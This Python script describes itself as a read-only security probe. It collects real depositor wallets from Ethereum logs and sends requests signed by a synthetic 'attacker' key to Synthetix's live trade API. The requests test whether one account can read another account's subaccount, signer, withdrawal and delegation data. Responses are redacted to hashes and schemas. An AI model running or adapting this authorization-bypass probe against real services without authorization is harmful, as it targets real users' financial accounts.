#!/usr/bin/env python3
"""Redacted, read-only cross-account authorization probe for Synthetix PAPI.

Safety properties:
- discovers candidate wallets from public Ethereum event logs only;
- uses a deterministic synthetic attacker key with no funds;
- sends only read actions to the trade API;
- never stores victim addresses, balances, positions, orders, or response values;
- records only hashes, status/error codes, response schemas and item counts;
- always emits a redacted summary, including on discovery or transport failure.
"""

from __future__ import annotations

import hashlib
import json
import pathlib
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data

OUT = pathlib.Path("read_auth_boundary")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
PAPI_TRADE = "https://papi.synthetix.io/v1/trade"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
PROXY_CREATION_BLOCK = 23_739_792
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
ATTACKER_PRIVATE_KEY = "0x" + "33" * 32
ATTACKER = Account.from_key(ATTACKER_PRIVATE_KEY)
MAX_HTTP_BODY = 2 * 1024 * 1024
UA = "Mozilla/5.0 (compatible; authorized-read-only-security-review/1.0)"

DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
TYPES = {
    "EIP712Domain": [
        {"name": "name", "type": "string"},
        {"name": "version", "type": "string"},
        {"name": "chainId", "type": "uint256"},
        {"name": "verifyingContract", "type": "address"},
    ],
    "SubAccountAction": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "action", "type": "string"},
        {"name": "expiresAfter", "type": "uint256"},
    ],
}

DIAG: dict[str, Any] = {
    "stage": "initializing",
    "rpc_calls": 0,
    "log_ranges_attempted": 0,
    "log_ranges_succeeded": 0,
    "deposit_logs_seen": 0,
    "unique_beneficiaries": 0,
    "papi_info_requests": [],
}


def digest_text(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes, dict[str, str]]:
    req = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read(MAX_HTTP_BODY + 1)
            if len(body) > MAX_HTTP_BODY:
                raise ValueError("response too large")
            return response.status, body, dict(response.headers.items())
    except urllib.error.HTTPError as exc:
        body = exc.read(MAX_HTTP_BODY + 1)
        return exc.code, body, dict(exc.headers.items()) if exc.headers else {}


def rpc(method: str, params: list[Any]) -> Any:
    DIAG["rpc_calls"] += 1
    errors: list[str] = []
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    for url in RPC_URLS:
        try:
            status, body, _ = post_json(url, payload, timeout=45)
            data = json.loads(body)
            if status >= 400 or "error" in data:
                code = data.get("error", {}).get("code") if isinstance(data.get("error"), dict) else None
                errors.append(f"status={status},code={code}")
                continue
            return data["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def parse_json(body: bytes) -> Any:
    try:
        return json.loads(body)
    except Exception:
        return None


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 3:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(val, depth + 1) for key, val in sorted(value.items())}
    if isinstance(value, list):
        sample = schema(value[0], depth + 1) if value else None
        return {"type": "list", "count": len(value), "sample_schema": sample}
    return type(value).__name__


def address_from_topic(topic: str) -> str:
    return "0x" + topic[-40:]


def get_logs(start: int, end: int) -> list[dict[str, Any]]:
    DIAG["log_ranges_attempted"] += 1
    params = [
        {
            "address": DEPOSIT_PROXY,
            "fromBlock": hex(start),
            "toBlock": hex(end),
            "topics": [ASSET_DEPOSITED_TOPIC],
        }
    ]
    result = rpc("eth_getLogs", params)
    DIAG["log_ranges_succeeded"] += 1
    return result


def recent_beneficiaries() -> list[str]:
    DIAG["stage"] = "discovering_deposit_beneficiaries"
    latest = int(rpc("eth_blockNumber", []), 16)
    DIAG["latest_block"] = latest
    unique: list[str] = []
    seen: set[str] = set()

    # At most 19 broad requests over the current deployment history. Providers
    # that reject 100k-block ranges get five 20k sub-ranges for that window.
    broad_chunk = 100_000
    end = latest
    while end >= PROXY_CREATION_BLOCK and len(unique) < 20:
        start = max(PROXY_CREATION_BLOCK, end - broad_chunk + 1)
        try:
            logs = get_logs(start, end)
        except Exception:
            logs = []
            small_chunk = 20_000
            sub_end = end
            while sub_end >= start and len(unique) < 20:
                sub_start = max(start, sub_end - small_chunk + 1)
                try:
                    logs.extend(get_logs(sub_start, sub_end))
                except Exception:
                    pass
                sub_end = sub_start - 1
        logs.sort(key=lambda item: (int(item["blockNumber"], 16), int(item["logIndex"], 16)), reverse=True)
        DIAG["deposit_logs_seen"] += len(logs)
        for log in logs:
            topics = log.get("topics", [])
            if len(topics) < 4:
                continue
            beneficiary = address_from_topic(topics[2])
            key = beneficiary.lower()
            if key not in seen and key != "0x" + "0" * 40:
                seen.add(key)
                unique.append(beneficiary)
            if len(unique) >= 20:
                break
        end = start - 1

    DIAG["unique_beneficiaries"] = len(unique)
    return unique


def get_account_ids(wallet: str) -> list[str]:
    payload = {
        "params": {
            "action": "getSubAccountIds",
            "walletAddress": wallet,
            "includeDelegations": True,
        }
    }
    status, body, _ = post_json(PAPI_INFO, payload)
    data = parse_json(body)
    response = data.get("response") if isinstance(data, dict) else None
    candidates: list[Any] = []
    if status == 200 and isinstance(data, dict) and data.get("status") == "ok":
        if isinstance(response, list):
            candidates.extend(response)
        elif isinstance(response, dict):
            for key in ("subAccountIds", "delegatedSubAccountIds", "managedSubAccountIds"):
                value = response.get(key)
                if isinstance(value, list):
                    candidates.extend(value)
    result: list[str] = []
    for value in candidates:
        text = str(value)
        if text.isdigit() and int(text) > 0 and text not in result:
            result.append(text)
    DIAG["papi_info_requests"].append(
        {
            "http_status": status,
            "api_status": data.get("status") if isinstance(data, dict) else None,
            "response_schema": schema(response),
            "account_id_count": len(result),
            "body_sha256": hashlib.sha256(body).hexdigest(),
        }
    )
    return result


def select_public_account() -> tuple[str, str]:
    DIAG["stage"] = "mapping_beneficiaries_to_public_account_ids"
    beneficiaries = recent_beneficiaries()
    for wallet in beneficiaries[:20]:
        ids = get_account_ids(wallet)
        if ids:
            DIAG["candidate_index"] = len(DIAG["papi_info_requests"]) - 1
            return wallet, ids[0]
        time.sleep(0.35)
    raise RuntimeError("No event beneficiary mapped to a public subaccount ID")


def sign_action(subaccount_id: str, action: str, expires_after: int) -> dict[str, Any]:
    full_message = {
        "types": TYPES,
        "primaryType": "SubAccountAction",
        "domain": DOMAIN,
        "message": {
            "subAccountId": int(subaccount_id),
            "action": action,
            "expiresAfter": expires_after,
        },
    }
    encoded = encode_typed_data(full_message=full_message)
    signed = ATTACKER.sign_message(encoded)
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def summarize_response(name: str, status: int, body: bytes) -> dict[str, Any]:
    data = parse_json(body)
    success = bool(status == 200 and isinstance(data, dict) and data.get("status") == "ok")
    error_code = None
    error_message_hash = None
    response_schema = None
    if isinstance(data, dict):
        error = data.get("error")
        if isinstance(error, dict):
            error_code = error.get("code")
            if error.get("message") is not None:
                error_message_hash = digest_text(str(error.get("message")))
        elif error is not None:
            error_message_hash = digest_text(str(error))
        if success:
            response_schema = schema(data.get("response"))
    return {
        "name": name,
        "http_status": status,
        "api_success": success,
        "error_code": error_code,
        "error_message_sha256": error_message_hash,
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "body_bytes": len(body),
        "response_schema": response_schema,
    }


def trade_read(name: str, subaccount_id: str, action: str, extra: dict[str, Any] | None = None) -> dict[str, Any]:
    expires_after = int(time.time()) + 120
    params: dict[str, Any] = {"action": action, "subAccountId": subaccount_id}
    if extra:
        params.update(extra)
    payload = {
        "params": params,
        "signature": sign_action(subaccount_id, action, expires_after),
        "expiresAfter": expires_after,
    }
    status, body, _ = post_json(PAPI_TRADE, payload)
    return summarize_response(name, status, body)


def run_probe() -> dict[str, Any]:
    wallet, subaccount_id = select_public_account()
    DIAG["stage"] = "testing_foreign_read_authorization"
    results: list[dict[str, Any]] = []

    status, body, _ = post_json(
        PAPI_TRADE,
        {"params": {"action": "getSubAccount", "subAccountId": subaccount_id}},
    )
    results.append(summarize_response("missing_signature_control", status, body))
    time.sleep(0.8)

    tests = [
        ("foreign_get_subaccount", "getSubAccount", None),
        ("foreign_get_delegated_signers", "getDelegatedSigners", None),
        ("foreign_get_withdrawable_amounts", "getWithdrawableAmounts", {"symbols": ["USDT", "WETH"]}),
        ("foreign_get_delegations_for_delegate", "getDelegationsForDelegate", {"owningAddress": wallet}),
    ]
    for name, action, extra in tests:
        results.append(trade_read(name, subaccount_id, action, extra))
        time.sleep(0.8)

    DIAG["stage"] = "completed"
    return {
        "safety": "Read-only actions only; no raw victim address, account ID, or response values retained.",
        "attacker_address": ATTACKER.address,
        "victim_address_sha256": digest_text(wallet.lower()),
        "victim_subaccount_id_sha256": digest_text(subaccount_id),
        "tests": results,
        "unexpected_authorization_success": any(
            item["api_success"] for item in results if item["name"].startswith("foreign_")
        ),
        "diagnostics": DIAG,
    }


def main() -> None:
    try:
        summary = run_probe()
    except BaseException as exc:  # noqa: BLE001
        summary = {
            "safety": "No state-changing request was issued; no raw victim data retained.",
            "unexpected_authorization_success": False,
            "probe_completed": False,
            "failure_type": type(exc).__name__,
            "failure_message_sha256": digest_text(str(exc)),
            "diagnostics": DIAG,
        }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
